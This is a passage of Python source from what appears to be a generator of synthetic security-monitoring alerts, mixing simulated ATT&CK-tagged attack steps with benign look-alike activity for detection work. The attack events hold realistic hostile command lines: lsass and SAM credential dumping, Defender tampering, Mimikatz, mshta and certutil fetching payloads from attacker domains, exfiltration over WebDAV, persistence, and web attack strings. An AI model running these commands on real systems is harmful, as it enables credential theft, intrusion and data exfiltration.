    shot = "[Reflection.Assembly]::LoadWithPartialName('System.Drawing');$b=New-Object Drawing.Bitmap 1920,1080;" \
           "$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen(0,0,0,0,$b.Size);$b.Save(\"$env:TEMP\\s.png\")"
    g.emit(t, host, "91803", A.script_block(ctx, host, t, text=shot, message=True),
           attack(s, "CopyFromScreen screenshot", "T1113", "T1113-8"))
    t = g.later(t, 5, 60)
    zipper = "Add-Type -A 'System.IO.Compression.FileSystem';[IO.Compression.ZipFile]::CreateFromDirectory(" \
             f"'C:\\Users\\{u}\\Documents','C:\\Users\\Public\\d.zip')"
    g.emit(t, host, "91846", A.script_block(ctx, host, t, text=zipper),
           attack(s, "Documents zipped with ZipFile::CreateFromDirectory", "T1560.001"))
    t = g.later(t, 0.5, 10)
    seven = r"C:\Windows\Temp\7z.exe"
    arc = f"{seven} a -tzip -p{_word(g)} C:\\Users\\Public\\f.zip C:\\Users\\{u}\\Desktop\\*"
    g.emit(t, host, "92067", A.process(ctx, host, t, image=seven, cmd=arc, parent=PS, parent_cmd=f"{PS} -nop", user=u,
                                       original="7z.exe"),
           attack(s, "password-protected archive with 7-Zip", "T1560.001", "T1560.001-4"),
           description=f"{win(seven)} launched by {win(PS)} executed a compressed file creation command")
    t = g.later(t, 1, 20)
    mount = f"net  use Z: \\\\{pick(g.rng, ATTACKER_DOMAINS)}@SSL\\DavWWWRoot\\drive /user:x"
    g.emit(t, host, "92038", A.process(ctx, host, t, image=NET, cmd=mount, parent=PS, parent_cmd=f"{PS} -nop", user=u),
           attack(s, "WebDAV mount of attacker cloud storage", "T1567.002"),
           description=f"A connection to cloud resource was started by {win(PS)}")


# =====================================================================================================================
# Single atomic runs (a purple-team sweep: one Atomic Red Team test, one host)
# =====================================================================================================================


def _single_windows(g: Gen, host: Host, t: datetime) -> None:
    s, ctx = "atomic-sweep", g.ctx
    u = host.owner or pick(g.rng, WIN_ADMINS)
    choice = g.rng.randrange(14)
    if choice == 0:
        g.emit(t, host, "92900", A.process_access(ctx, host, t, source=RUNDLL, target=LSASS, access="0x1010", user=u),
               attack(s, "rundll32 comsvcs.dll MiniDump of lsass", "T1003.001", "T1003.001-2"),
               description=f"Lsass process was accessed by {win(RUNDLL)} with read permissions, possible credential dump")
    elif choice == 1:
        cmd = r"powershell.exe -c [System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM', 'C:\Users\Public\SAM')"
        g.emit(t, host, "92024", A.process(ctx, host, t, image=PS, cmd=cmd, parent=CMD, parent_cmd="cmd.exe", user=u,
                                           integrity="High"),
               attack(s, "SAM hive copied out of a shadow copy", "T1003.002", "T1003.002-6"))
    elif choice == 2:
        tamper = f"{PS} Set-MpPreference -DisableIOAVProtection 1"
        g.emit(t, host, "92010", A.process(ctx, host, t, image=PS, cmd=tamper, parent=CMD, parent_cmd="cmd.exe", user=u,
                                           integrity="High"),
               attack(s, "Defender download scanning turned off", "T1562.001", "T1562.001-16"))
    elif choice == 3:
        svc = pick(g.rng, ("WinSvcHost", "WinUpdSvc2", "MsUpdSvc"))
        g.emit(t, host, "61138", A.service_installed(ctx, host, t, name=svc, image=r"C:\Users\Public\svc.exe",
                                                     start="auto start"),
               attack(s, "sc.exe create a service running a dropped binary", "T1543.003", "T1543.003-2"))
    elif choice == 4:
        drop = f"C:\\Users\\{u}\\AppData\\Local\\Temp\\{g.ctx.hexstr(6)}.exe"
        g.emit(t, host, "92213", A.file_create(ctx, host, t, image=PS, target=drop, user=u),
               attack(s, "Invoke-WebRequest drops an executable in %TEMP%", "T1105", "T1105-15"))
    elif choice == 5:
        cmd = f"{PS} -c Remove-Item C:\\Windows\\Temp\\*.log -Force; Remove-Item $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
        g.emit(t, host, "92021", A.process(ctx, host, t, image=PS, cmd=cmd, parent=CMD, parent_cmd="cmd.exe", user=u),
               attack(s, "PowerShell history file deleted", "T1070.003", "T1070.003-12"))
    elif choice == 6:
        wipe = r"sdelete64.exe -accepteula -p 3 C:\Users\Public\sam.save"
        g.emit(t, host, "92063", A.process(ctx, host, t, image=r"C:\Users\Public\sdelete64.exe", cmd=wipe,
                                           parent=CMD, parent_cmd="cmd.exe", user=u),
               attack(s, "sdelete wipes a staged file", "T1070.004"),
               description=f"File deletion by sdelete.exe. Command: {win(wipe)}")
    elif choice == 7:
        hta = f"mshta.exe javascript:a=(GetObject(\"script:https://{pick(g.rng, ATTACKER_DOMAINS)}/m.sct\")).Exec();close();"
        g.emit(t, host, "92048", A.process(ctx, host, t, image=r"C:\Windows\System32\mshta.exe", cmd=hta, parent=EXCEL,
                                           parent_cmd=f'"{EXCEL}" /dde', user=u),
               attack(s, "mshta fetches a remote scriptlet", "T1218.005", "T1218.005-1"))
    elif choice == 8:
        key = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealthUpd"
        g.emit(t, host, "92302", A.registry_set(ctx, host, t, image=REG, key=key, details=r"C:\Users\Public\shu.exe",
                                                user=u),
               attack(s, "reg add HKLM Run key", "T1547.001", "T1547.001-1"))
    elif choice == 9:
        dest = r"C:\Windows\System32\cmd.exe /c C:\Users\Public\beacon.exe"
        g.emit(t, host, "89502", A.wmi_consumer(ctx, host, t, name="SCM Event Log Consumer2", destination=dest, user=u),
               attack(s, "CommandLineEventConsumer for persistence", "T1546.003", "T1546.003-1"))
    elif choice == 10:
        cmd = f"{PS} -nop -e {encoded('Invoke-Mimikatz -DumpCreds')}"
        g.emit(t, host, "92057", A.process(ctx, host, t, image=PS, cmd=cmd, parent=PS, parent_cmd=PS, user=u,
                                           integrity="High"),
               attack(s, "encoded Invoke-Mimikatz", "T1059.001", "T1059.001-1"))
    elif choice == 11:
        out = f"C:\\Users\\Public\\{g.ctx.hexstr(4)}.dll"
        cmd = f"certutil.exe -urlcache -f https://{pick(g.rng, ATTACKER_DOMAINS)}/a.dll {out}"
        g.emit(t, host, "92075", A.process(ctx, host, t, image=CERTUTIL, cmd=cmd, parent=CMD, parent_cmd=f"{CMD} /c {cmd}",
                                           user=u),
               attack(s, "certutil downloads a DLL", "T1105", "T1105-7"),
               description="CertUtil.exe launched with commands to create a binary file")
    elif choice == 12:
        text = "$k='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'; New-ItemProperty -Path $k -Name Updater " \
               "-Value 'C:\\Users\\Public\\upd.exe' -PropertyType String -Force"
        g.emit(t, host, "91844", A.script_block(ctx, host, t, text=text),
               attack(s, "New-ItemProperty adds a Run value", "T1547.001"))
    else:
        cmd = f"{PS} -c \"$s=New-PSSession -ComputerName {pick(g.rng, WIN_SERVERS).name}; Invoke-Command -Session $s -ScriptBlock {{whoami}}\""
        g.emit(t, host, "91823", A.script_block(ctx, host, t, text=cmd.split(' -c ', 1)[1].strip('"')),
               attack(s, "Invoke-Command runs code on a remote computer", "T1021.006"))


def _single_linux(g: Gen, host: Host, t: datetime) -> None:
    s, ctx = "atomic-sweep", g.ctx
    choice = g.rng.randrange(7)
    if choice == 0:
        name = pick(g.rng, ("butter", "toor", "svc-ops"))
        g.emit(t, host, "5902", A.useradd(host, t, g.rng.randrange(3000, 9000), name, 0),
               attack(s, f"useradd -o -u 0 {name} (second root account)", "T1136.001", "T1136.001-6"))
    elif choice == 1:
        g.emit(t, host, "80784", A.audit_watch(ctx, host, t, path="/etc/shadow", exe="/usr/bin/cat", uid=0, auid=1001,
                                               key="audit-wazuh-r"),
               attack(s, "cat /etc/shadow", "T1003.008", "T1003.008-1"),
               description="Audit: Watch - Read access: /etc/shadow.")
    elif choice == 2:
        g.emit(t, host, "554", A.fim(ctx, host, t, path="/etc/cron.d/apt-compat-check", event="added", size=59),
               attack(s, "script dropped in /etc/cron.d", "T1053.003", "T1053.003-3"))
    elif choice == 3:
        argv = ["python3", "/tmp/psexec.py", "-hashes", "aad3b435b51404ee" * 2 + ":" + g.ctx.hexstr(32),
                f"Administrator@{pick(g.rng, WIN_SERVERS).ip}"]
        body = A.audit_execve(ctx, host, t, argv=argv, exe="/usr/bin/python3.10", uid=1001, auid=1001, cwd="/tmp")
        g.emit(t, host, "92602", body, attack(s, "Impacket psexec.py pass-the-hash from a Linux foothold", "T1550.002"))
    elif choice == 4:
        g.emit(t, host, "92605", A.audit_execve(ctx, host, t, argv=["ls", "--color=auto", "-laR", "/home"], exe="/usr/bin/ls",
                                                uid=0, auid=1001, cwd="/root"),
               attack(s, "ls -laR over home directories", "T1083", "T1083-3"))
    elif choice == 5:
        g.emit(t, host, "550", A.fim(ctx, host, t, path="/etc/sudoers", event="modified", size=812, size_before=755,
                                     perm="r--r-----"),
               attack(s, "Defaults timestamp_timeout=-1 added to sudoers", "T1548.003", "T1548.003-3"))
    else:
        argv = ["python3", "-c", "import pty;pty.spawn('/bin/bash')"]
        g.emit(t, host, "80792", A.audit_execve(ctx, host, t, argv=argv, exe="/usr/bin/python3.10", uid=33,
                                                auid=4294967295, cwd="/tmp", tty="(none)"),
               attack(s, "python pty.spawn upgrades a reverse shell", "T1059.006", "T1059.006-4"),
               description="Audit: Command: /usr/bin/python3.10.")


def single_atomic(g: Gen) -> None:
    day = g.rng.randrange(DAYS)
    t = g.at(day, 7, 19)
    if g.maybe(0.7):
        _single_windows(g, pick(g.rng, WORKSTATIONS + WIN_SERVERS), t)
    else:
        _single_linux(g, pick(g.rng, LINUX_SERVERS), t)


# =====================================================================================================================
# Benign activity: routine noise and look-alikes
# =====================================================================================================================


def admin_ssh(g: Gen) -> None:
    host, admin = pick(g.rng, LINUX_SERVERS), pick(g.rng, LINUX_ADMINS + ("deploy", "ansible"))
    t = g.at(g.workday(), 7, 19)
    pid = g.rng.randrange(1000, 60000)
    if g.maybe(0.6):
        g.emit(t, host, "5715", A.sshd(host, t, pid, f"Accepted publickey for {admin} from {BASTION_IP} port {{port}} ssh2",
                                       {"srcip": BASTION_IP, "srcport": g.ctx.port(), "dstuser": admin}),
               noise("noise:admin-ssh", f"{admin} logs in from the bastion with a key"))
    else:
        g.emit(t, host, "5501", A.pam_session(host, t, pid, admin, 1001 + LINUX_ADMINS.index(admin) if admin in LINUX_ADMINS else 1010),
               noise("noise:admin-ssh", f"PAM session for {admin}"))


def admin_sudo(g: Gen) -> None:
    host, admin = pick(g.rng, LINUX_SERVERS), pick(g.rng, LINUX_ADMINS)
    t = g.at(g.workday(), 7, 20)
    command = pick(g.rng, ("/usr/bin/systemctl restart nginx", "/usr/bin/apt-get update", "/usr/bin/journalctl -u app -n 200",
                           "/usr/bin/tail -f /var/log/syslog", "/usr/bin/systemctl status postgresql",
                           "/usr/sbin/nginx -t", "/usr/bin/docker ps", "/usr/bin/df -h"))
    if g.maybe(0.12):
        new = pick(g.rng, NEW_HIRES)
        g.emit(t, host, "5403", A.sudo(host, t, new, command, f"/home/{new}"),
               noise("noise:admin-sudo", f"new team member {new} runs sudo for the first time"))
        return
    g.emit(t, host, "5402", A.sudo(host, t, admin, command, f"/home/{admin}"),
           noise("noise:admin-sudo", f"{admin}: sudo {command}"))


def ssh_typo(g: Gen) -> None:
    host, admin = pick(g.rng, LINUX_SERVERS), pick(g.rng, LINUX_ADMINS)
    t = g.at(g.workday(), 7, 19)
    g.emit(t, host, "5760", A.sshd(host, t, g.rng.randrange(1000, 60000),
                                   f"Failed password for {admin} from {BASTION_IP} port {{port}} ssh2",
                                   {"srcip": BASTION_IP, "srcport": g.ctx.port(), "dstuser": admin}),
           noise("noise:ssh-typo", f"{admin} mistypes a password once from the bastion"))


def windows_logons(g: Gen) -> None:
    ctx = g.ctx
    t = g.at(g.workday(), 7, 19)
    kind = g.rng.randrange(4)
    if kind == 0:
        ws = pick(g.rng, WORKSTATIONS)
        g.emit(t, ws, "60118", A.logon(ctx, ws, t, user=ws.owner, src_ip="127.0.0.1", workstation=ws.name, logon_type=2,
                                       kerberos=True),
               noise("noise:windows-logon", f"{ws.owner} signs in at their workstation"))
    elif kind == 1:
        srv = pick(g.rng, WIN_SERVERS)
        svc = pick(g.rng, list(SERVICE_ACCOUNTS.values()))
        src = pick(g.rng, WIN_SERVERS)
        g.emit(t, srv, "60106", A.logon(ctx, srv, t, user=svc, src_ip=src.ip, workstation=src.name, kerberos=True),
               noise("noise:windows-logon", f"{svc} network logon from {src.name}"))
    elif kind == 2:
        rds = HOSTS["SRV-RDS-01"]
        ws = pick(g.rng, WORKSTATIONS)
        g.emit(t, rds, "60106", A.logon(ctx, rds, t, user=ws.owner, src_ip=ws.ip, workstation=ws.name, logon_type=10,
                                        kerberos=True),
               noise("noise:windows-logon", f"{ws.owner} opens a Remote Desktop session from {ws.name}"))
    else:
        ws = pick(g.rng, WORKSTATIONS)
        g.emit(t, ws, "60137", A.security(ctx, ws, t, 4634, {"targetUserSid": A.sid(1200), "targetUserName": ws.owner,
                                                             "targetDomainName": DOMAIN, "targetLogonId": ctx.logon_id(),
                                                             "logonType": "2"}),
               noise("noise:windows-logon", f"{ws.owner} signs out"))


def logon_typo(g: Gen) -> None:
    ws = pick(g.rng, WORKSTATIONS)
    dc = pick(g.rng, DCS)
    t = g.at(g.workday(), 7, 10)
    g.emit(t, dc, "60122", A.logon(g.ctx, dc, t, user=ws.owner, src_ip=ws.ip, workstation=ws.name, ok=False),
           noise("noise:logon-typo", f"{ws.owner} mistypes the password at the Monday morning logon"))


def stale_credentials(g: Gen) -> None:
    """Look-alike of password guessing: a device keeps retrying an old password after a reset."""
    ws = pick(g.rng, WORKSTATIONS)
    dc = pick(g.rng, DCS)
    t = g.at(g.workday(), 8, 18)
    phone = f"10.20.40.{g.rng.randrange(20, 240)}"
    if g.maybe(0.5):
        g.emit(t, dc, "60122", A.logon(g.ctx, dc, t, user=ws.owner, src_ip=phone, workstation="-", ok=False),
               lookalike("lookalike:stale-credentials", f"{ws.owner}'s phone retries the old mail password", "T1110.001"))
        return
    body = A.logon(g.ctx, dc, t, user=ws.owner, src_ip=ws.ip, workstation=ws.name, ok=False)
    g.emit(t, dc, "60204", body,
           lookalike("lookalike:stale-credentials", f"a mapped drive on {ws.name} retries {ws.owner}'s old password",
                     "T1110.001"))


def account_lifecycle(g: Gen) -> None:
    """Look-alikes of account creation and manipulation: joiners, movers, leavers, helpdesk."""
    ctx = g.ctx
    dc = pick(g.rng, DCS)
    t = g.at(g.workday(), 8, 17)
    kind = g.rng.randrange(6)
    if kind == 0:
        new = pick(g.rng, NEW_HIRES)
        g.emit(t, dc, "60109", A.account_event(ctx, dc, t, 4720, actor="svc_idm", target=new, samAccountName=new),
               lookalike("lookalike:account-lifecycle", f"identity system provisions new hire {new}", "T1136.002"))
    elif kind == 1:
        g.emit(t, dc, "60111", A.account_event(ctx, dc, t, 4725, actor="svc_idm", target=pick(g.rng, ("cwalker", "mlopez", "jkim"))),
               noise("noise:account-lifecycle", "identity system disables a leaver"))
    elif kind == 2:
        ws = pick(g.rng, WORKSTATIONS)
        g.emit(t, dc, "60133", A.account_event(ctx, dc, t, 4767, actor=pick(g.rng, HELPDESK), target=ws.owner),
               noise("noise:account-lifecycle", f"helpdesk unlocks {ws.owner}"))
    elif kind == 3:
        ws = pick(g.rng, WORKSTATIONS)
        g.emit(t, dc, "60110", A.account_event(ctx, dc, t, 4738, actor=pick(g.rng, HELPDESK), target=ws.owner,
                                               passwordLastSet=t.strftime("%m/%d/%Y %I:%M:%S %p")),
               noise("noise:account-lifecycle", f"helpdesk resets {ws.owner}'s password"))
    elif kind == 4:
        rds = HOSTS["SRV-RDS-01"]
        member = pick(g.rng, NEW_HIRES)
        g.emit(t, rds, "60179", A.group_member_added(ctx, rds, t, actor=pick(g.rng, HELPDESK), member=member,
                                                     group="Remote Desktop Users", group_sid="S-1-5-32-555"),
               lookalike("lookalike:account-lifecycle", f"helpdesk grants {member} Remote Desktop access (ticket)", "T1098"))
    else:
        srv = pick(g.rng, WIN_SERVERS)
        admin = pick(g.rng, WIN_ADMINS)
        g.emit(t, srv, "60154", A.group_member_added(ctx, srv, t, actor=admin, member="adm.tlee" if admin == "adm.ksmith" else "adm.ksmith",
                                                     group="Administrators", group_sid="S-1-5-32-544"),
               lookalike("lookalike:account-lifecycle", f"{admin} adds a colleague's admin account during a change", "T1098"))


INSTALLS = (
    ("Google Chrome", "GoogleChromeElevationService", r"C:\Program Files\Google\Chrome\Application\130.0.6723.70\elevation_service.exe"),
    ("Zoom Workplace (64-bit)", "ZoomCptService", r"C:\Program Files\Zoom\bin\CptService.exe"),
    ("7-Zip 24.08 (x64 edition)", "", ""),
    ("Microsoft Edge", "edgeupdate", r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe /svc"),
    ("Mozilla Firefox (x64 en-US)", "MozillaMaintenance", r"C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"),
    ("Adobe Acrobat (64-bit)", "AdobeARMservice", r"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe"),
    ("Microsoft Teams Meeting Add-in", "", ""),
    ("Cisco Secure Client - AnyConnect VPN", "csc_vpnagent", r"C:\Program Files (x86)\Cisco\Cisco Secure Client\vpnagent.exe"),
)


def windows_patching(g: Gen) -> None:
    ctx = g.ctx
    host = pick(g.rng, WORKSTATIONS + WIN_SERVERS)
    t = g.at(g.rng.randrange(DAYS), 1, 5) if host.role != "workstation" else g.at(g.workday(), 9, 17)
    product, service, image = pick(g.rng, INSTALLS)
    kind = g.rng.randrange(7)
    if kind == 0:
        g.emit(t, host, "60612", A.msi_installed(ctx, host, t, product=product),
               noise("noise:windows-patching", f"{product} installed by software distribution"),
               description=f"Application installed Product: {product} -- Installation completed successfully..")
    elif kind == 1 and service:
        g.emit(t, host, "61138", A.service_installed(ctx, host, t, name=service, image=image, start="auto start"),
               lookalike("lookalike:windows-patching", f"{product} installer registers its service", "T1543.003"))
    elif kind == 2:
        g.emit(t, host, "61104", A.service_start_type(ctx, host, t, display="Background Intelligent Transfer Service",
                                                      name="BITS", old="auto start", new="demand start"),
               noise("noise:windows-patching", "Windows Update changes the BITS start type"))
    elif kind == 3:
        g.emit(t, host, "62130", A.defender(ctx, host, t, 2000, {
            "current Signature Version": f"1.421.{g.rng.randrange(100, 900)}.0",
            "previous Signature Version": f"1.421.{g.rng.randrange(10, 99)}.0", "signature Type": "AntiVirus",
            "update Type": "Delta"}),
            noise("noise:windows-patching", "Defender definitions updated"))
    elif kind == 4:
        dll = pick(g.rng, (r"C:\Windows\System32\DriverStore\FileRepository\iigd_dch.inf_amd64\igdumdim64.dll",
                           r"C:\Windows\WinSxS\amd64_microsoft-windows-edgechromium\msedge_7z.data.dll",
                           r"C:\Windows\System32\spool\drivers\x64\3\hpcpn6de.dll"))
        g.emit(t, host, "92217", A.file_create(ctx, host, t, image=r"C:\Windows\servicing\TrustedInstaller.exe",
                                               target=dll, user="SYSTEM"),
               lookalike("lookalike:windows-patching", "cumulative update writes a DLL under C:\\Windows", "T1570"))
    elif kind == 5 and host.role == "workstation":
        updater, folder = pick(g.rng, ((r"C:\Program Files\Zoom\bin\Zoom.exe", r"Zoom_cm_fo42mnktZ9w\Installer.exe"),
                                        (r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe", r"GUM4F2A.tmp\GoogleUpdateSetup.exe"),
                                        (r"C:\Program Files\WindowsApps\MSTeams\ms-teams_autostarter.exe", r"MSTeamsUpdate\Update.exe")))
        tmp = f"C:\\Users\\{host.owner}\\AppData\\Local\\Temp\\{folder}"
        g.emit(t, host, "92213", A.file_create(ctx, host, t, image=updater, target=tmp, user=host.owner),
               lookalike("lookalike:windows-patching", "application updater unpacks its installer in %TEMP%", "T1105"))
    else:
        g.emit(t, host, "62108", A.defender(ctx, host, t, 1001, {"scan Type": "Antimalware", "scan Parameters": "Quick Scan",
                                                                  "domain": "NT AUTHORITY", "user": "SYSTEM",
                                                                  "scan Time Hours": "0", "scan Time Minutes": str(g.rng.randrange(2, 9))}),
               noise("noise:windows-patching", "scheduled Defender quick scan finishes"))


LINUX_PACKAGES = (("openssl", "3.0.13-0ubuntu3.4"), ("libssl3t64", "3.0.13-0ubuntu3.4"), ("linux-image-6.8.0-48-generic", "6.8.0-48.48"),
                  ("nginx", "1.24.0-2ubuntu7.1"), ("curl", "8.5.0-2ubuntu10.5"), ("sudo", "1.9.15p5-3ubuntu5.24.04.1"),
                  ("python3.12", "3.12.3-1ubuntu0.3"), ("tzdata", "2024b-0ubuntu0.24.04"), ("openssh-server", "1:9.6p1-3ubuntu13.6"))


def linux_patching(g: Gen) -> None:
    host = pick(g.rng, LINUX_SERVERS + (HOSTS["bastion-01"],))
    day = g.rng.randrange(DAYS)
    t = g.at(day, 2, 4)
    kind = g.rng.randrange(4)
    if host.name == "db-01":
        pkg = pick(g.rng, ("postgresql16-server-16.4-1PGDG.rhel9.x86_64", "openssl-libs-3.0.7-28.el9_4.x86_64",
                           "kernel-5.14.0-427.40.1.el9_4.x86_64"))
        g.emit(t, host, "2933", A.yum(host, t, pkg, updated=True), noise("noise:linux-patching", f"dnf updates {pkg}"))
        return
    pkg, version = pick(g.rng, LINUX_PACKAGES)
    if kind < 3:
        g.emit(t, host, "2902", A.dpkg(host, t, pkg, version), noise("noise:linux-patching", f"unattended-upgrades installs {pkg}"))
    else:
        path = pick(g.rng, ("/usr/bin/sudo", "/usr/sbin/sshd", "/usr/bin/curl", "/usr/lib/x86_64-linux-gnu/libssl.so.3"))
        g.emit(t, host, "550", A.fim(g.ctx, host, t, path=path, event="modified", size=g.rng.randrange(200_000, 2_000_000),
                                     perm="rwxr-xr-x" if "/bin/" in path else "rw-r--r--"),
               lookalike("lookalike:linux-patching", f"package upgrade replaces {path}", "T1554"))


def scanner(g: Gen) -> None:
    """Look-alikes of reconnaissance and exploitation: the authorised weekly vulnerability scan."""
    day = 3 if g.maybe(0.5) else 10  # Wednesday night scans
    t = g.at(day, 1, 5)
    kind = g.rng.randrange(7)
    ua = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    if kind in (0, 1):
        host = pick(g.rng, LINUX_SERVERS)
        pid = g.rng.randrange(1000, 60000)
        user = pick(g.rng, ("nessus", "root1", "admin", "test"))
        body = A.sshd(host, t, pid, f"Invalid user {user} from {SCANNER_IP} port {{port}}",
                      {"srcip": SCANNER_IP, "srcport": g.ctx.port(), "srcuser": user})
        rule = "5710"
        if kind == 1:
            rule = "5712"
            body["previous_output"] = A.previous(
                [f"{A.syslog_stamp(t)} {host.name} sshd[{pid - i}]: Invalid user u{i} from {SCANNER_IP} port {g.ctx.port()}"
                 for i in range(7)])
        g.emit(t, host, rule, body, lookalike("lookalike:vulnerability-scan", "authorised scanner checks default SSH accounts", "T1110.001"))
        return
    host = pick(g.rng, WEB)
    if kind == 2:
        body = A.access_log(host, t, src_ip=SCANNER_IP, method="GET", url="/nessus-check/x.cgi", status=404, size=153, agent=ua)
        body["previous_output"] = "\n".join(f'{SCANNER_IP} - - [{t:%d/%b/%Y:%H:%M:%S} +0000] "GET /{g.ctx.hexstr(8)}.html HTTP/1.1" 404 153 "-" "{ua}"' for _ in range(13))
        g.emit(t, host, "31151", body, lookalike("lookalike:vulnerability-scan", "scanner content discovery", "T1595.003"))
    elif kind == 3:
        g.emit(t, host, "31104", A.access_log(host, t, src_ip=SCANNER_IP, method="GET", url="/index.php?page=../../../../etc/passwd",
                                              status=404, size=153, agent=ua),
               lookalike("lookalike:vulnerability-scan", "scanner path traversal check", "T1190"))
    elif kind == 4:
        g.emit(t, host, "31103", A.access_log(host, t, src_ip=SCANNER_IP, method="GET",
                                              url="/search?q=1%20union%20select%20null,null--", status=400, size=166, agent=ua),
               lookalike("lookalike:vulnerability-scan", "scanner SQL injection check", "T1190"))
    elif kind == 5:
        g.emit(t, host, "31168", A.access_log(host, t, src_ip=SCANNER_IP, method="GET", url="/cgi-bin/status", status=404,
                                              size=153, agent="() { :; }; echo; /bin/sh -c 'echo nessus'"),
               lookalike("lookalike:vulnerability-scan", "scanner Shellshock check", "T1190"))
    else:
        g.emit(t, host, "31101", A.access_log(host, t, src_ip=SCANNER_IP, method="OPTIONS", url="/", status=405, size=166,
                                              agent=ua),
               noise("noise:vulnerability-scan", "scanner method enumeration"))


def backups(g: Gen) -> None:
    ctx = g.ctx
    t = g.at(g.rng.randrange(DAYS), 0, 3)
    kind = g.rng.randrange(4)
    if kind == 0:
        src = pick(g.rng, LINUX_SERVERS)
        g.emit(t, src, "5715", A.sshd(src, t, g.rng.randrange(1000, 60000),
                                      f"Accepted publickey for backup from {HOSTS['backup-01'].ip} port {{port}} ssh2",
                                      {"srcip": HOSTS["backup-01"].ip, "srcport": ctx.port(), "dstuser": "backup"}),
               noise("noise:backups", "nightly backup pulls over SSH"))
    elif kind == 1:
        host = HOSTS["backup-01"]
        body = A.audit_execve(ctx, host, t, argv=["scp", "-f", "/var/backups/db-01/pg_dump.sql.gz"], exe="/usr/bin/scp",
                              uid=1005, auid=1005, cwd="/var/backups", tty="(none)")
        body["data"]["audit"]["file"] = {"name": "/var/backups/db-01/pg_dump.sql.gz", "mode": "0100640"}
        g.emit(t, host, "92603", body, lookalike("lookalike:backups", "backup job copies a database dump with scp", "T1021.004"))
    elif kind == 2:
        host = pick(g.rng, LINUX_SERVERS)
        g.emit(t, host, "92605", A.audit_execve(ctx, host, t, argv=["ls", "--color=auto", "-laR", "/etc"], exe="/usr/bin/ls", uid=0,
                                                auid=4294967295, cwd="/", tty="(none)"),
               lookalike("lookalike:backups", "backup pre-script lists /etc recursively for its manifest", "T1083"))
    else:
        srv = pick(g.rng, WIN_SERVERS)
        bkp = HOSTS["SRV-BKP-01"]
        g.emit(t, srv, "60106", A.logon(ctx, srv, t, user=SERVICE_ACCOUNTS["backup"], src_ip=bkp.ip, workstation=bkp.name,
                                        kerberos=True),
               noise("noise:backups", "backup service account connects to take the nightly image"))


def config_management(g: Gen) -> None:
    """Look-alikes from Ansible runs: root cron, sudoers, keys, users and units changed on purpose."""
    ctx = g.ctx
    host = pick(g.rng, LINUX_SERVERS)
    t = g.at(g.workday(), 9, 17)
    kind = g.rng.randrange(8)
    run = f"/tmp/.ansible-ansible/tmp/ansible-tmp-{int(t.timestamp())}.{g.rng.randrange(1000, 9999)}-{g.rng.randrange(100, 9999)}"
    if kind == 0:
        module = pick(g.rng, ("AnsiballZ_apt.py", "AnsiballZ_copy.py", "AnsiballZ_systemd.py", "AnsiballZ_lineinfile.py"))
        g.emit(t, host, "92601", A.audit_execve(ctx, host, t, argv=["/usr/bin/python3", f"{run}/{module}"],
                                                exe="/usr/bin/python3.12", uid=0, auid=1003, cwd=run),
               lookalike("lookalike:config-management", f"Ansible runs {module} from its temp directory", "T1059.006"))
    elif kind == 1:
        g.emit(t, host, "2833", A.crontab(host, t, g.rng.randrange(3000, 9000), "root"),
               lookalike("lookalike:config-management", "Ansible cron module installs the logrotate job", "T1053.003"))
    elif kind == 2:
        g.emit(t, host, "550", A.fim(ctx, host, t, path="/etc/sudoers.d/ops", event="modified", size=212, size_before=168,
                                     perm="r--r-----"),
               lookalike("lookalike:config-management", "sudoers for the ops group updated from the repository", "T1548.003"))
    elif kind == 3:
        g.emit(t, host, "550", A.fim(ctx, host, t, path="/root/.ssh/authorized_keys", event="modified", size=1_142,
                                     size_before=1_139, perm="rw-------"),
               lookalike("lookalike:config-management", "quarterly SSH key rotation", "T1098.004"))
    elif kind == 4:
        new = pick(g.rng, NEW_HIRES)
        g.emit(t, host, "5902", A.useradd(host, t, g.rng.randrange(3000, 9000), new, 1000 + g.rng.randrange(10, 60)),
               lookalike("lookalike:config-management", f"onboarding playbook creates {new}", "T1136.001"))
    elif kind == 5:
        g.emit(t, host, "554", A.fim(ctx, host, t, path=pick(g.rng, ("/etc/systemd/system/node_exporter.service",
                                                                      "/etc/systemd/system/fluent-bit.service")),
                                     event="added", size=388),
               lookalike("lookalike:config-management", "monitoring agent unit deployed", "T1543.002"))
    elif kind == 6:
        g.emit(t, host, "550", A.fim(ctx, host, t, path=pick(g.rng, ("/etc/nginx/nginx.conf", "/etc/hosts", "/etc/ssh/sshd_config",
                                                                      "/etc/resolv.conf")),
                                     event="modified", size=g.rng.randrange(300, 4000)),
               noise("noise:config-management", "configuration file updated by the playbook"))
    else:
        g.emit(t, host, "5402", A.sudo(host, t, "ansible", "/bin/sh -c echo BECOME-SUCCESS-" + g.ctx.b64(32).lower() +
                                       " ; /usr/bin/python3 " + run + "/AnsiballZ_setup.py", "/home/ansible", tty="unknown"),
               noise("noise:config-management", "Ansible becomes root"))


def monitoring(g: Gen) -> None:
    host = pick(g.rng, LINUX_SERVERS)
    t = g.at(g.rng.randrange(DAYS), 0, 24)
    g.emit(t, host, "92604", A.audit_execve(g.ctx, host, t, argv=["ps", "aux", "--sort=-%mem"], exe="/usr/bin/ps", uid=0,
                                            auid=4294967295, cwd="/", tty="(none)"),
           lookalike("lookalike:monitoring", "monitoring agent samples the process table", "T1057"))


def it_admin_windows(g: Gen) -> None:
    """IT and endpoint management doing things attackers also do."""
    ctx = g.ctx
    it = HOSTS["IT-WS-01"]
    t = g.at(g.workday(), 8, 18)
    kind = g.rng.randrange(10)
    hd = pick(g.rng, HELPDESK)
    if kind == 0:
        user = pick(g.rng, WORKSTATIONS).owner
        g.emit(t, it, "92039", A.process(ctx, it, t, image=NET, cmd=f"net  user {user} /domain", parent=CMD,
                                         parent_cmd=CMD, user=hd),
               lookalike("lookalike:it-admin", f"helpdesk checks {user}'s account status for a ticket", "T1087.002"))
    elif kind == 1:
